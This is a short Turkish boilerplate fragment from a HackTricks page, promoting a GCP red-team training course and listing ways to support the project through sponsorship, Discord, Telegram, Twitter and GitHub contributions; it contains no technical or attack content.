GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Ekip Uzmanı (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
